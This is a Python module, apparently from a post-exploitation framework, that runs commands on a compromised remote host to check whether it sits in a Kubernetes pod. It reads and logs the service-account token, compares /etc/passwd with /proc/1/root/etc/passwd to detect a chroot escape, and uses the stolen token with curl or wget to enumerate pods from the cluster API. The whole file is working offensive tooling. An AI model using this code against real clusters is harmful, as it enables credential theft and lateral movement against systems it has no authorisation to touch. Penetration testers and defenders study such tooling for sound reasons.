from toboggan.core.action import BaseAction
from toboggan.utils.jwt import TokenReader


class KubeCheckAction(BaseAction):
    DESCRIPTION = (
        "Check for Kubernetes environment and enumerate basic pod-level access."
    )

    def run(self) -> str:
        self._logger.info("☁️ Kubernetes Environment Check")

        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        cert_path = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

        # Step 1: Check if token exists
        token = self._executor.remote_execute(f"cat {token_path}").strip()
        if not token:
            self._logger.warning("⚠️ No Kubernetes token found — likely not in a pod.")
            return

        self._logger.success(f"🔐 Found Kubernetes token: {token}")

        try:
            reader = TokenReader(token)
            api_server = reader.iss

            self._logger.info(f"🌍 Kubernetes API server: {api_server}")
        except Exception:
            self._logger.error("❌ Failed to parse the Kubernetes token.")
            return

        # Step 2: Check if CA certificate exists
        if not self._executor.remote_execute(f"cat {cert_path}"):
            self._logger.warning("⚠️ No Kubernetes CA certificate found.")
            return
        self._logger.success(f"📜 Kubernetes CA certificate found: {cert_path}")

        # Step 3: Check if we are inside a container
        cgroup_info = self._executor.remote_execute("cat /proc/1/cgroup")
        self._logger.info(f"🔍 Cgroup info: {cgroup_info.strip()}")

        if cgroup_info.strip() == "0::/":
            self._logger.info("🖥️ Likely running on host (not containerized).")
        else:
            if "kubepods" in cgroup_info:
                self._logger.info("📦 Inside a Kubernetes pod.")
            else:
                self._logger.info("🔍 Uncertain container context.")

            # Step 4: Attempt chroot escape detection
            etc_passwd = self._executor.remote_execute("cat /etc/passwd").strip()
            root_etc_passwd = self._executor.remote_execute(
                "cat /proc/1/root/etc/passwd"
            ).strip()

            if etc_passwd != root_etc_passwd:
                self._logger.success(
                    "🚪 Detected chroot escape possible — /proc/1/root/etc/passwd differs from guest."
                )
            else:
                self._logger.info(
                    "🔐 Same /etc/passwd inside and outside — likely no escape or already on host."
                )

        # Step 5: Attempt to fetch pods
        self._logger.info("📡 Attempting to enumerate pods from API")

        if curl_path := self._executor.remote_execute("command -v curl"):
            curl_cmd = (
                f"{curl_path.strip()} --cacert {cert_path} "
                f"-H 'Authorization: Bearer {token}' "
                f"{api_server}/api/v1/pods"
            )
            self._logger.info("🚀 Using curl to query pods.")
            response = self._executor.remote_execute(curl_cmd, timeout=10)
        elif wget_path := self._executor.remote_execute("command -v wget"):
            wget_cmd = (
                f"{wget_path.strip()} --ca-certificate={cert_path} "
                f"--header='Authorization: Bearer {token}' "
                f"{api_server}/api/v1/pods -O -"
            )
            self._logger.info("🚀 Using wget to query pods.")
            response = self._executor.remote_execute(wget_cmd, timeout=10)
            if "unrecognized option" in response:
                self._logger.error("❌ wget does not support --ca-certificate option.")
                return
        else:
            self._logger.error("❌ No suitable HTTP client found (curl/wget).")
            return

        if response:

            if "kind" in response and "PodList" in response:
                self._logger.success("✅ Successfully queried pods from the API.")
            else:
                self._logger.warning(
                    "⚠️ Query sent, but response didn't contain pod data."
                )

            self._logger.info(f"📄 Response: {response.strip()}")
        else:
            self._logger.error("❌ No response from Kubernetes API.")
